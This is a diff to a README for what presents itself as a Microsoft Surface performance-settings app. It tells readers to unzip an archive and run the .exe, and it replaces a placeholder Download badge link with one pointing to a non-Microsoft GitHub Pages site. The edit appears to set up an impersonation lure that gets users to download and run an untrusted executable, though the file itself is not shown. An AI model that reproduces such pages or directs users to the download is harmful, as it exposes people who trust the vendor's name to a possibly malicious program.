@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://microsoft-surface-app.github.io/.github/)
 
 ## 📸 Overview
 ![microsoft-surface-performance-settings](https://github.com/user-attachments/assets/dac18ae8-9d57-4721-b080-74153067c02f)
